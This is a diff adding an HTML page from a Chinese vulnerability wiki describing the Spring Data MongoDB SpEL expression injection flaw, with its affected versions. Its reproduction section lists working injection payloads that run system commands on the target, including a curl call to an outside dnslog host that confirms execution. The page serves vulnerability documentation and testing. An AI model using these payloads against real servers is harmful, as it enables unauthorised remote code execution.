@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SpringDataMongoDB/SpringDataMongoDBSpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Data MongoDB SpEL表达式注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Data MongoDB SpEL\u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u4e09\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Springbootgateway%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Springbootgateway%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring boot gateway存在命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../SpringBoot/SpringBootjolokiaRealmJNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../SpringBoot/SpringBootjolokiaRealmJNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring Boot jolokia Realm JNDI远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-data-mongodb-spel">Spring Data MongoDB SpEL表达式注入漏洞<a class="headerlink" href="#spring-data-mongodb-spel" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>Spring官方发布了关于Spring Data MongoDB SpEL表达式注入漏洞的修复信息，当使用@Query或@Aggregation注解进行查询时，若通过SpEL表达式中形如“?0”的占位符来进行参数赋值，同时应用程序未对用户输入进行过滤处理，则可能受到SpEL表达式注入的影响，成功利用该漏洞的攻击者可在目标服务器上执行代码。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>Spring Data MongoDB == 3.4.0</p>
+<p>3.3.0 &lt;= Spring Data MongoDB &lt;= 3.3.4</p>
+<p>旧的、不受支持的版本也会受到影响</p>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+<p><img alt="1730011780302-72a7fb38-c2c2-4f89-bf47-cdd8f776e224.png" src="./img/ZExlZ6n1pcklAxos/1730011780302-72a7fb38-c2c2-4f89-bf47-cdd8f776e224-536417.png" /></p>
+<h1 id="_4">三、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>#更新
+/name=T(java.lang.String).forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;apt-get update&#39;)
+
+#下载curl
+/name=T(java.lang.String).forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;apt-get install -y curl&#39;)
+</code></pre></div>
+<p>执行curl dnslog</p>
+<div class="highlight"><pre><span></span><code>/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27curl%20hrnceuwsrl.iyhc.eu.org%27)
+</code></pre></div>
+<p><img alt="1730012025414-b5771bdf-4af2-42ab-873f-54933df0e54b.png" src="./img/ZExlZ6n1pcklAxos/1730012025414-b5771bdf-4af2-42ab-873f-54933df0e54b-779912.png" /></p>
+<blockquote>
+<p>更新: 2024-11-27 10:04:43<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/dcbhf1pnmuar814k">https://www.yuque.com/xiaokp7/ocvun2/dcbhf1pnmuar814k</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Springbootgateway%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Springbootgateway%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring boot gateway存在命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../SpringBoot/SpringBootjolokiaRealmJNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../SpringBoot/SpringBootjolokiaRealmJNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring Boot jolokia Realm JNDI远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
